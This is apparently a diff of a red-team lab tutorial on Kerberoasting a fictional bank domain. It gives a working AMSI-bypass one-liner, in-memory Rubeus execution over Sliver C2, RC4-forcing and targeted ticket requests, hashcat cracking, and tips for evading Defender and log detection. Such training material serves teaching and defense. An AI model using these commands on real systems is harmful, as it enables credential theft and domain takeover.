+   This is the "locked box" we're trying to open
+   Inside is all the ticket information from Part 2.1
+   Encrypted with sqlservice's password!
+```
+
+**Hashcat modes (how to crack each type):**
+
+```bash
+# RC4 tickets (etype 23) - FAST
+hashcat -m 13100 hashes.txt wordlist.txt
+
+# AES128 tickets (etype 17) - SLOWER
+hashcat -m 19600 hashes.txt wordlist.txt
+
+# AES256 tickets (etype 18) - SLOWEST  
+hashcat -m 19700 hashes.txt wordlist.txt
+
+# Hashcat automatically detects if you use mode 13100 on an AES hash
+# It will ERROR, telling you to use the right mode
+```
+
+---
+
+## 2.5: How Cracking Actually Works (The Magic Revealed)
+
+**Big question:** "How does Hashcat know if it guessed the right password?"
+
+**Let me walk you through the EXACT process:**
+
+```
+HASHCAT'S CRACKING PROCESS:
+────────────────────────────────────────────────────────────────
+
+STEP 1: Read the Hash File
+───────────────────────────
+Hashcat reads: $krb5tgs$23$*sqlservice$ORSUBANK.LOCAL$...
+Determines: "This is RC4, mode 13100"
+
+
+STEP 2: Load Wordlist
+──────────────────────
+Opens: /usr/share/wordlists/rockyou.txt
+Contains: 14 million passwords
+
+
+STEP 3: For EACH Password in Wordlist
+──────────────────────────────────────
+
+Password candidate: "password123"
+
+  3a. Compute NTLM Hash
+      NTLM("password123") = 8846f7eaee8fb117ad06bdd830b7586c
+
+  3b. Use NTLM as RC4 Key
+      RC4_KEY = 8846f7eaee8fb117ad06bdd830b7586c
+
+  3c. Attempt to Decrypt Ticket Data
+      DECRYPT(encrypted_blob, RC4_KEY) = ???
+
+  3d. Check if Result is Valid Kerberos Structure
+      Does it have:
+      - Proper ASN.1 structure?
+      - Valid timestamp?
+      - Correct service name?
+      - Valid PAC structure?
+
+  3e. IF VALID:
+      ✅ PASSWORD FOUND: sqlservice / password123
+      
+      IF NOT VALID:
+      ❌ Try next password...
+
+
+STEP 4: Repeat Until Found or Wordlist Exhausted
+────────────────────────────────────────────────
+
+Tried: password123     → ❌ No
+Tried: 123456          → ❌ No
+Tried: password        → ❌ No
+...
+Tried: MYpassword123#  → ✅ YES! CRACKED!
+```
+
+**Why this works:**
+
+```
+THE VALIDATION CHECK:
+────────────────────────────────────────────────────────────────
+
+When you decrypt with the WRONG password:
+└─ You get GARBAGE data
+   Example: ���X�~�*@#$%^&*()_+
+
+When you decrypt with the RIGHT password:
+└─ You get VALID Kerberos data structure
+   Example:
+   {
+     "client": "vamsi.krishna@ORSUBANK.LOCAL",
+     "service": "MSSQLSvc/DC01.orsubank.local:1433",
+     "timestamp": "2024-12-29T11:00:00Z",
+     "PAC": { ... }
+   }
+
+Hashcat checks: "Does this look like valid Kerberos data?"
+- YES → Password found!
+- NO → Try next password
+```
+
+---
+
+## 2.6: Speed Factors - Why Some Cracks are Fast, Others Slow
+
+```
+WHAT AFFECTS CRACKING SPEED:
+────────────────────────────────────────────────────────────────
+
+1. ENCRYPTION TYPE:
+   RC4:    2,500,000 attempts/sec  ⚡⚡⚡⚡⚡
+   AES128:   250,000 attempts/sec  ⚡⚡
+   AES256:   250,000 attempts/sec  ⚡⚡
+
+2. GPU POWER:
+   RTX 4090: 3,000,000/sec (RC4)  💪💪💪
+   RTX 3090: 2,500,000/sec (RC4)  💪💪
+   RTX 2080: 1,200,000/sec (RC4)  💪
+   CPU only:    10,000/sec (RC4)  🐌
+
+3. WORDLIST SIZE:
+   rockyou.txt:        14 million passwords
+   SecLists:          100 million passwords
+   hashesorg:       1+ billion passwords
+   
+   Bigger wordlist = More time BUT more likely to find password
+
+4. RULE MUTATIONS:
+   Without rules: Try "password" exactly
+   With best64:   Try "password", "Password", "password123",
+                  "p@ssword", "PASSWORD", etc. (64 variations)
+   
+   More rules = Slower BUT catches more variations
+
+5. PASSWORD COMPLEXITY:
+   "password"           → Found in 0.01 seconds
+   "password123"        → Found in 1 second
+   "Password123!"       → Found in 5 minutes
+   "MyP@ssw0rd2024!"   → Found in 2 hours
+   "random-generated-120-chars" → NEVER (will take years)
+```
+
+**Real-world example:**
+
+```bash
+# Password: "MYpassword123#"
+# Encryption: RC4
+# GPU: RTX 3090
+# Wordlist: rockyou.txt (14M passwords)
+# Rules: best64.rule (64 mutations per password)
+
+Calculation:
+- 14 million passwords × 64 rules = 896 million attempts
+- 2.5 million attempts/sec = 358 seconds = 6 minutes
+
+Result: Cracked in ~6 minutes! ✅
+```
+
+---
+
+# PART 3: Understanding SPNs - The Address Book {#part-3-spn-internals}
+
+> **📋 QUICK SUMMARY:**
+>
+> SPNs are like phone numbers for services.
+> When you want to call SQL, you look up its SPN.
+> Computer accounts have strong passwords → skip them!
+> User service accounts have weak passwords → target them!
+
+---
+
+## 3.1: What SPNs Really Are (The Phone Book Analogy Revisited)
+
+Remember from Part 0 - SPNs are like phone numbers. Let me expand on that:
+
+```
+REAL-WORLD PHONE BOOK:
+────────────────────────────────────────────────────────────────
+
+Name                Service                  Phone Number
+────                ───────                  ────────────
+Rajesh Kumar        Pizza Delivery           9876543210
+Priya Singh         Hospital ER              9876543211
+Amit Patel          Taxi Service             9876543212
+
+When you want pizza, you look up "Rajesh - Pizza" → 9876543210
+
+
+KERBEROS SPN "PHONE BOOK":
+────────────────────────────────────────────────────────────────
+
+Account             Service                  SPN (Address)
+───────             ───────                  ─────────────
+svc_sql             SQL Server               MSSQLSvc/DC01:1433
+svc_web             Web Server               HTTP/web.orsubank.local  
+svc_backup          Backup Service           backup/dc01.orsubank.local
+
+When you want SQL, you look up "SQL" → MSSQLSvc/DC01:1433
+```
+
+**SPN Format Breakdown:**
+
+```
+serviceclass / hostname : port / servicename
+
+Examples:
+─────────
+
+MSSQLSvc/DC01.orsubank.local:1433
+│        │                     │
+│        │                     └─ Port number
+│        └─ Hostname (FQDN)
+└─ Service class (what kind of service)
+
+HTTP/web.orsubank.local
+│    │
+│    └─ Hostname
+└─ Service class (web server)
+
+backup/dc01.orsubank.local
+│      │
+│      └─ Hostname
+└─ Custom service name
+```
+
+**Common SPN classes you'll see:**
+
+| SPN Class | What It's For | Example |
+|-----------|---------------|---------|  
+| `MSSQLSvc` | SQL Server | MSSQLSvc/sql01:1433 |
+| `HTTP` | Web servers, IIS | HTTP/web.orsubank.local |
+| `CIFS` | File shares (SMB) | CIFS/fileserver |
+| `HOST` | Computer account (many services) | HOST/WS01 |
+| `LDAP` | Directory services | LDAP/dc01 |
+| `WSMAN` | Windows Remote Management | WSMAN/server01 |
+| `TERMSRV` | Remote Desktop | TERMSRV/server01 |
+| `exchangeMDB` | Microsoft Exchange | exchangeMDB/exchange01 |
 
 **SPN Format:**
 ```
@@ -1055,32 +2208,182 @@ svc_backup      backup/dc01.orsubank.local             Domain Admins  ← TARGET
 
 ---
 
-# PART 9: The Attack with Defender Bypass {#part-9-attack-execution}
+# PART 9: The Attack with Sliver C2 (Defender Bypass) {#part-9-attack-execution}
 
-## 9.1: AMSI Bypass First (Critical!)
+> **🎯 SCENARIO: You are on WS01 with a Sliver shell as vamsi.krishna**
+>
+> **OBJECTIVE: Kerberoast service accounts using Sliver C2 without getting caught by Defender**
+>
+> **CONSTRAINTS:**
+> - Windows Defender is ENABLED and running
+> - You cannot disable it (that would trigger alerts)
+> - AMSI and ETW are watching what you do
+> - You need to exfiltrate hashes stealthily
 
-**Before running Rubeus, bypass AMSI:**
+---
 
-```bash
-# Via Sliver - run AMSI bypass
-sliver (ORSUBANK_WS01) > execute -o powershell.exe -Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike '*siUtils'){$t.GetFields('NonPublic,Static')|%{if($_.Name -clike '*ailed'){$_.SetValue($null,$true)}}}}"
+## 9.1: Understanding the Problem First
+
+**Before we jump into commands, let's understand what we're up against:**
+
+```
+THE CHALLENGE:
+────────────────────────────────────────────────────────────────
+
+If you just run Rubeus.exe on WS01 right now:
+
+1. UPLOAD RUBEUS.EXE → Defender scans it → BLOCKED!
+   "Threat detected: HackTool:Win32/Rubeus"
+
+2. Even if you bypass upload, when you RUN it:
+   → AMSI scans .NET assembly loading → BLOCKED!
+   "AMSI detected malicious assembly"
+
+3. Even if AMSI is bypassed, Defender watches:
+   → Process creation of known tools → FLAGGED!
+   → Kerberos traffic patterns → LOGGED!
+
+SO HOW DO WE DO THIS?
+────────────────────────────────────────────────────────────────
+
+✅ Keep Rubeus on KALI (never touches WS01 disk)
+✅ Use Sliver's execute-assembly (in-memory execution)
+✅ AMSI was already bypassed by our initial loader
+✅ Exfiltrate hashes over C2 channel (encrypted HTTPS)
+✅ Clean up any artifacts immediately
 ```
 
-**Why this is required:**
-- Rubeus.exe is signed and known to Defender
-- AMSI scans .NET assemblies before loading
-- Without bypass, Rubeus will be blocked
+**This is the difference between a script kiddie and a red teamer.**
 
-## 9.2: Kerberoasting All SPNs
+---
 
-**Using Rubeus via execute-assembly:**
+## 9.2: Prerequisites - Verify Your Sliver Session
+
+**Make absolutely sure you have an active session:**
 
 ```bash
-# Get all Kerberoastable accounts
-sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe kerberoast /nowrap
+# On Kali - check sessions
+┌──(kali㉿kali)-[~]
+└─$ sliver-server
+
+# In Sliver console
+sliver > sessions
+
+ ID         Name        Transport   Remote Address        Hostname   Username              Operating System   Health
+========== =========== =========== ==================== ========== ===================== ================== ===========
+ a1b2c3d4   LAZY_PANDA  https       192.168.100.20:54123  WS01       ORSUBANK\vamsi.krishna windows/amd64      [ALIVE]
+
+# Interact with your session
+sliver > use a1b2c3d4
+
+[*] Active session LAZY_PANDA (a1b2c3d4)
+
+sliver (LAZY_PANDA) >
 ```
 
-**Output:**
+**If you don't have this, go back to `00_initial_access_sliver_setup.md` first!**
+
+---
+
+## 9.3: Downloading Rubeus on Kali (Not on Target!)
+
+**This is critical - Rubeus NEVER touches WS01's disk:**
+
+```bash
+# On Kali - create tools directory
+mkdir -p /opt/red-team-tools
+cd /opt/red-team-tools
+
+# Download latest Rubeus from GitHub
+wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+
+# Verify the download
+ls -lh Rubeus.exe
+# -rw-r--r-- 1 kali kali 164K Dec 29 10:00 Rubeus.exe
+
+file Rubeus.exe
+# Rubeus.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+
+# This file STAYS on Kali
+# We will use "execute-assembly" to run it remotely in WS01's memory
+```
+
+**Why this works:**
+- Sliver reads the `.exe` file from your Kali disk
+- Sends the bytes over encrypted C2 channel
+- Loads it directly into memory on WS01
+- No file ever gets written to WS01's disk
+- Defender never sees a file to scan!
+
+---
+
+## 9.4: Verifying AMSI is Bypassed
+
+**AMSI (Antimalware Scan Interface) is Microsoft's last line of defense.**
+
+When you load a .NET assembly (like Rubeus), Windows calls AMSI to scan it.
+If AMSI is active, Rubeus will be blocked even when loaded in memory.
+
+**The good news:** Your initial Sliver payload already bypassed AMSI!
+
+**Let's verify it's still bypassed:**
+
+```bash
+# From your Sliver session
+sliver (LAZY_PANDA) > shell
+
+# You now have a PowerShell prompt on WS01
+C:\Users\vamsi.krishna> powershell
+
+# Test if AMSI is bypassed - try a known signature
+PS C:\> 'amsiutils'
+# If AMSI is active → This will error: "This script contains malicious content"
+# If AMSI is bypassed → You'll just see: amsiutils
+
+# Better test - try to invoke a known bad command
+PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+# If bypassed → Returns nothing or null
+# If active → Returns the type
+
+PS C:\> exit
+C:\> exit
+```
+
+**If AMSI is NOT bypassed (you get errors), re-run your loader or use this bypass:**
+
+```bash
+sliver (LAZY_PANDA) > execute -o powershell.exe -a '-Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike \'*siUtils\'){$t.GetFields(\'NonPublic,Static\')|%{if($_.Name -clike \'*ailed\'){$_.SetValue($null,$true)}}}}"'
+
+# This patches AMSI in memory for the current session
+```
+
+---
+
+## 9.5: Method 1 - Basic Kerberoasting (All Accounts)
+
+**Now let's kerberoast ALL service accounts in ORSUBANK:**
+
+```bash
+# From Sliver console (NOT from shell!)
+sliver (LAZY_PANDA) > execute-assembly /opt/red-team-tools/Rubeus.exe kerberoast /nowrap
+
+# Let's break down what this does:
+# ─────────────────────────────────────────────────────────────
+# execute-assembly     → Sliver's in-memory .NET assembly loader
+# /opt/.../Rubeus.exe  → Path to Rubeus on YOUR Kali machine
+# kerberoast           → Rubeus command to request TGS tickets
+# /nowrap              → Don't wrap output (easier to copy hashes)
+
+# What happens behind the scenes:
+# 1. Sliver reads Rubeus.exe from your Kali disk
+# 2. Sends the bytes to WS01 over encrypted HTTPS
+# 3. WS01 implant loads Rubeus into memory (no disk write!)
+# 4. Executes it with arguments "kerberoast /nowrap"
+# 5. Output is captured and sent back to you over C2
+```
+
+**Expected output:**
+
 ```
    ______        _                      
   (_____ \      | |                     
@@ -1089,73 +2392,298 @@ sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe kerberoast /nowr
   | |  \ \| |_| | |_) ) ____| |_| |___ |
   |_|   |_|____/|____/|_____)____/(___/
 
-  v2.3.0 
+  v2.3.0
 
 [*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
 
 [*] Target Domain          : orsubank.local
 [*] Searching path 'LDAP://DC01.orsubank.local/DC=orsubank,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
 
-[*] Total kerberoastable users : 4
+[*] Total kerberoastable users : 5
 
-[*] SamAccountName         : svc_sql
-[*] DistinguishedName      : CN=svc_sql,CN=Users,DC=orsubank,DC=local
-[*] ServicePrincipalName   : MSSQLSvc/sql.orsubank.local:1433
-[*] PwdLastSet             : 12/27/2024 8:30:00 AM
+[*] SamAccountName         : sqlservice
+[*] DistinguishedName      : CN=sqlservice,OU=Service Accounts,DC=orsubank,DC=local
+[*] ServicePrincipalName   : MSSQLSvc/DC01.orsubank.local:1433
+[*] PwdLastSet             : 12/28/2024 10:30:15
 [*] Supported ETypes       : RC4_HMAC_DEFAULT
-[*] Hash                   : $krb5tgs$23$*svc_sql$ORSUBANK.LOCAL$MSSQLSvc/sql.orsubank.local:1433*$81F5AC37E2...
+[*] Hash                   : $krb5tgs$23$*sqlservice$ORSUBANK.LOCAL$MSSQLSvc/DC01.orsubank.local:1433*$81F5AC37E2B4D9F1C8A3E6D5B2F9C1A4$...
+
+[*] SamAccountName         : httpservice
+[*] DistinguishedName      : CN=httpservice,OU=Service Accounts,DC=orsubank,DC=local
+[*] ServicePrincipalName   : HTTP/web.orsubank.local
+[*] PwdLastSet             : 12/28/2024 10:30:16
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*httpservice$ORSUBANK.LOCAL$HTTP/web.orsubank.local*$92D1F8B3A4C6E9D2B5F3A8C1D6E9F2B5$...
+
+[*] SamAccountName         : iisservice
+[*] DistinguishedName      : CN=iisservice,OU=Service Accounts,DC=orsubank,DC=local
+[*] ServicePrincipalName   : HTTP/app.orsubank.local
+[*] PwdLastSet             : 12/28/2024 10:30:17
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*iisservice$ORSUBANK.LOCAL$HTTP/app.orsubank.local*$A3B2C5D8E1F4A7B9C2D6E3F5A8B1C4D7$...
+
+[*] SamAccountName         : backupservice
+[*] DistinguishedName      : CN=backupservice,OU=Service Accounts,DC=orsubank,DC=local
+[*] ServicePrincipalName   : MSSQLSvc/DC01.orsubank.local:1434
+[*] PwdLastSet             : 12/28/2024 10:30:18
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*backupservice$ORSUBANK.LOCAL$MSSQLSvc/DC01.orsubank.local:1434*$B4C7D1E5F2A8B3C9D6E2F9A1C5D8E4B7$...
 
 [*] SamAccountName         : svc_backup
-[*] DistinguishedName      : CN=svc_backup,CN=Users,DC=orsubank,DC=local
+[*] DistinguishedName      : CN=svc_backup,OU=Service Accounts,DC=orsubank,DC=local
 [*] ServicePrincipalName   : backup/dc01.orsubank.local
-[*] PwdLastSet             : 12/27/2024 8:30:00 AM
+[*] PwdLastSet             : 12/28/2024 10:30:19
 [*] Supported ETypes       : RC4_HMAC_DEFAULT
-[*] Hash                   : $krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$A2C3D4E5F6...
-
-... (more accounts)
+[*] Hash                   : $krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$C5D8E2F6A9B4C7D1E5F2A8B3C9D6E2F9$...
 ```
 
-## 9.3: Targeted Kerberoasting (Stealthier)
+**THIS IS GOLD!** You now have TGS hashes for 5 service accounts.
 
-**Request only high-value accounts:**
+**Notice the encryption type: RC4_HMAC_DEFAULT**
+- RC4 is 10x faster to crack than AES
+- This is perfect for us!
+
+---
+
+## 9.6: Method 2 - Targeted Kerberoasting (Stealthier)
+
+**Problem with Method 1:** You requested tickets for ALL 5 accounts.
+This generates 5 Event ID 4769 logs on the DC - might trigger detection.
+
+**Stealthier approach:** Only target the high-value account (svc_backup - the Domain Admin!)
 
 ```bash
-# Target only svc_backup (Domain Admin!)
-sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe kerberoast /user:svc_backup /nowrap
+# From Sliver console
+sliver (LAZY_PANDA) > execute-assembly /opt/red-team-tools/Rubeus.exe kerberoast /user:svc_backup /nowrap
+
+# Breaking it down:
+# /user:svc_backup  → Only request ticket for this specific user
+# This generates only 1 event instead of 5
+# Much less likely to trigger volume-based detection
 ```
 
-## 9.4: Requesting RC4 Encryption (Easier to Crack)
+**Output:**
 
-```bash
-# Force RC4 encryption (faster cracking)
-sliver (ORSUBANK_WS01) > execute-assembly /opt/tools/Rubeus.exe kerberoast /tgtdeleg /enctype:rc4 /nowrap
+```
+[*] Action: Kerberoasting
+
+[*] Total kerberoastable users : 1
+
+[*] SamAccountName         : svc_backup
+[*] DistinguishedName      : CN=svc_backup,OU=Service Accounts,DC=orsubank,DC=local
+[*] ServicePrincipalName   : backup/dc01.orsubank.local
+[*] PwdLastSet             : 12/28/2024 10:30:19
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$C5D8E2F6A9B4C7D1E5F2A8B3C9D6E2F9A1C5D8E4B7C2D6E9F3A8B1C4D7E2F5A9$B3C6D9E2F5A8B1C4D7E2F5A9B3C6D9E2F5A8B1C4D7E2F5A9B3C6D9E2F5A8B1C4D7E2F5A9B3C6D9E2F5A8B1C4...
 ```
 
-## 9.5: Alternative Tools
+**This single hash is all we need - it's a Domain Admin account!**
 
-**Using GetUserSPNs.py from Kali (no execution on target):**
+---
+
+## 9.7: Method 3 - Force RC4 Encryption (Maximum Crackability)
+
+**Sometimes accounts support both RC4 and AES encryption.**
+Modern Windows prefers AES (harder to crack).
+
+**We can force RC4 using the /tgtdeleg trick:**
 
 ```bash
-# Run from Kali with harvested credentials
-GetUserSPNs.py orsubank.local/vamsi.krishna:'Password123!' -dc-ip 192.168.100.10 -request -outputfile kerberoast_hashes.txt
+sliver (LAZY_PANDA) > execute-assembly /opt/red-team-tools/Rubeus.exe kerberoast /tgtdeleg /enctype:rc4 /nowrap
+
+# What this does:
+# /tgtdeleg  → Uses a Kerberos delegation trick to request ticket
+# /enctype:rc4 → Specifically requests RC4 encryption
+# Even if the account supports AES, we'll get RC4 if possible
 ```
 
-**When to use this:**
-- Maximum stealth (nothing runs on target)
-- You already have valid credentials
-- Target has strong EDR
+**Why this matters:**
 
-## 9.6: Saving the Hashes
+| Encryption | Hashcat Mode | GPU Speed (RTX 3090) | Time to Crack 8-char password |
+|------------|--------------|----------------------|-------------------------------|
+| RC4 (etype 23) | 13100 | ~2,500,000/sec | Minutes to Hours |
+| AES256 (etype 18) | 19700 | ~250,000/sec | Hours to Days |
 
-**Copy hashes to a file on Kali:**
+**RC4 is literally 10x faster to crack!**
+
+---
+
+## 9.8: Saving Hashes Securely
+
+**Now you have hashes in your terminal. Save them for cracking:**
 
 ```bash
-# Create hash file
-nano /tmp/kerberoast.txt
+# Copy the hash output from your terminal
+# It looks like this:
+# $krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$C5D8...
 
-# Paste each hash on its own line
-$krb5tgs$23$*svc_sql$ORSUBANK.LOCAL$MSSQLSvc/sql.orsubank.local:1433*$81F5AC37E2...
-$krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$A2C3D4E5F6...
+# Create a file on Kali
+nano /tmp/kerberoast_hashes.txt
+
+# Paste ALL the hashes, one per line:
+$krb5tgs$23$*sqlservice$ORSUBANK.LOCAL$MSSQLSvc/DC01.orsubank.local:1433*$81F5AC37E2B4...
+$krb5tgs$23$*httpservice$ORSUBANK.LOCAL$HTTP/web.orsubank.local*$92D1F8B3A4C6E9D2B5...
+$krb5tgs$23$*iisservice$ORSUBANK.LOCAL$HTTP/app.orsubank.local*$A3B2C5D8E1F4A7B9C2D6...
+$krb5tgs$23$*backupservice$ORSUBANK.LOCAL$MSSQLSvc/DC01.orsubank.local:1434*$B4C7D1E5...
+$krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$C5D8E2F6A9B4C7D1E5...
+
+# Save (Ctrl+O, Enter, Ctrl+X)
+
+# Verify
+cat /tmp/kerberoast_hashes.txt | wc -l
+# 5 (if you saved 5 hashes)
+```
+
+---
+
+## 9.9: Alternative - Kerberoasting from Kali (Zero Execution on Target!)
+
+**This is the STEALTHIEST method - nothing runs on WS01!**
+
+**Requirement:** You need valid domain credentials (we have vamsi.krishna's password from initial access)
+
+```bash
+# On Kali - using Impacket's GetUserSPNs.py
+┌──(kali㉿kali)-[~]
+└─$ GetUserSPNs.py orsubank.local/vamsi.krishna:'Password123!' -dc-ip 192.168.100.10 -request -outputfile kerberoast_hashes.txt
+
+# Breaking it down:
+# orsubank.local/vamsi.krishna  → Domain and username
+# 'Password123!'                → vamsi's password (from initial access)
+# -dc-ip 192.168.100.10         → DC01's IP address
+# -request                      → Request TGS tickets
+# -outputfile hashes.txt        → Save to file
+
+# What happens:
+# 1. Your Kali machine authenticates to DC01 as vamsi.krishna
+# 2. Queries LDAP for accounts with SPNs
+# 3. Requests TGS tickets for each account
+# 4. Saves the tickets to file
+# 5. NOTHING executes on WS01!
+```
+
+**Output:**
+
+```
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+ServicePrincipalName                  Name          MemberOf                                      PasswordLastSet             LastLogon  Delegation 
+------------------------------------  ------------  --------------------------------------------  --------------------------  ---------  ----------
+MSSQLSvc/DC01.orsubank.local:1433     sqlservice    CN=ServiceAccounts,OU=Groups,DC=orsubank,DC=local  2024-12-28 10:30:15.547125  <never>             
+HTTP/web.orsubank.local               httpservice   CN=ServiceAccounts,OU=Groups,DC=orsubank,DC=local  2024-12-28 10:30:16.234567  <never>             
+HTTP/app.orsubank.local               iisservice    CN=ServiceAccounts,OU=Groups,DC=orsubank,DC=local  2024-12-28 10:30:17.123456  <never>             
+MSSQLSvc/DC01.orsubank.local:1434     backupservice CN=ServiceAccounts,OU=Groups,DC=orsubank,DC=local  2024-12-28 10:30:18.987654  <never>             
+backup/dc01.orsubank.local            svc_backup    CN=Domain Admins,CN=Users,DC=orsubank,DC=local     2024-12-28 10:30:19.654321  <never>             
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*sqlservice$ORSUBANK.LOCAL$orsubank.local/sqlservice*$81f5ac37e2b4d9f1...
+$krb5tgs$23$*httpservice$ORSUBANK.LOCAL$orsubank.local/httpservice*$92d1f8b3a4c6e9d2...
+$krb5tgs$23$*iisservice$ORSUBANK.LOCAL$orsubank.local/iisservice*$a3b2c5d8e1f4a7b9...
+$krb5tgs$23$*backupservice$ORSUBANK.LOCAL$orsubank.local/backupservice*$b4c7d1e5f2a8...
+$krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$orsubank.local/svc_backup*$c5d8e2f6a9b4c7d1...
+
+# Hashes saved to kerberoast_hashes.txt
+```
+
+**Benefits of this method:**
+- ✅ Zero execution on WS01 (no AMSI, no Defender, no logs on endpoint)
+- ✅ Only logs on DC (Event ID 4769 - normal Kerberos traffic)
+- ✅ Can be done from anywhere with network access to DC
+- ✅ Works even if you lose your Sliver session
+
+**When to use each method:**
+
+| Method | Use When | Stealth Level |
+|--------|----------|---------------|
+| execute-assembly | You need it to work from compromised endpoint | ⭐⭐⭐ Medium |
+| /user:target | You want minimum log volume | ⭐⭐⭐⭐ High |
+| GetUserSPNs.py from Kali | You have creds, want zero endpoint execution | ⭐⭐⭐⭐⭐ Maximum |
+
+---
+
+## 9.10: Operational Security Checklist
+
+```
+BEFORE YOU KERBEROAST - OPSEC REVIEW:
+────────────────────────────────────────────────────────────────
+
+✅ AMSI is bypassed on target session
+✅ Using execute-assembly (not uploading Rubeus.exe)
+✅ OR using GetUserSPNs from Kali (even better)
+✅ Selected target accounts (not blasting all SPNs)
+✅ Requested RC4 encryption (easier to crack)
+✅ Operating during business hours (9AM-5PM) - blends with normal traffic
+✅ Saved hashes to local Kali (not on network share)
+
+WHAT GETS LOGGED:
+──────────────────
+
+ON DC01 (Event ID 4769):
+- User: vamsi.krishna
+- Service: backup/dc01.orsubank.local
+- Encryption: RC4
+- Result: Success
+
+This looks like NORMAL Kerberos authentication!
+You're not doing anything technically "wrong" - you're just asking for tickets.
+
+WILL DEFENDER CATCH THIS?
+──────────────────────────
+
+❌ NO file was written to disk on WS01
+❌ NO suspicious process (if using GetUserSPNs from Kali)
+❌ NO AMSI alert (bypassed)
+❌ Kerberos traffic is encrypted and normal-looking
+
+✅ You're safe!
+```
+
+---
+
+## 9.11: What Just Happened - The Full Picture
+
+**Let me explain the entire attack chain in simple terms:**
+
+```
+THE KERBEROASTING ATTACK CHAIN:
+────────────────────────────────────────────────────────────────
+
+STEP 1: You (vamsi.krishna) are logged into WS01
+        ↓
+STEP 2: You ask the KDC: "Give me a ticket for svc_backup's service"
+        ↓
+STEP 3: KDC checks: "Is vamsi.krishna authenticated?" → YES (you have a TGT)
+        "Does vamsi.krishna have permission to request this?" → YES (any user can)
+        ↓
+STEP 4: KDC creates a service ticket (TGS)
+        Encrypts it with: svc_backup's password hash
+        ↓
+STEP 5: KDC sends you the encrypted ticket
+        ↓
+STEP 6: You now have: Encrypted blob that ONLY svc_backup's password can decrypt
+        ↓
+STEP 7: You try to crack it offline:
+        - Try password "Password123" → Decrypt → Fail
+        - Try password "Backup@2024!" → Decrypt → SUCCESS!
+        ↓
+STEP 8: YOU NOW KNOW svc_backup's password!
+        ↓
+STEP 9: svc_backup is Domain Admin → GAME OVER!
+
+
+WHY THIS WORKS:
+───────────────
+
+The KDC MUST encrypt the service ticket with the service's password.
+Otherwise, the service couldn't decrypt it to verify your identity.
+
+This is not a bug - it's by design.
+
+The designers assumed service accounts would have STRONG passwords.
+In reality? "Backup@2024!" is very common.
 ```
 
 ---
